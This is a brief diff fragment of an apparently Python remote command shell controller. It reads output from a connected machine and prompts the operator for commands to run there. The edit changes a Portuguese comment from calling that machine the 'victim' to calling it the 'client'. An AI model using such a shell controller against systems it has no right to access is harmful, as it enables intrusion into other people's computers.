@@ -17,7 +17,7 @@ while True:
     
     receive = client.recv(1024).decode()
     print(receive)
-    #digite o comando para rodar no cmd da vitima
+    #digite o comando para rodar no cmd do cliente
     cmd = input("Digite o seu comando: ")
 
     #digite 'exit' para sair
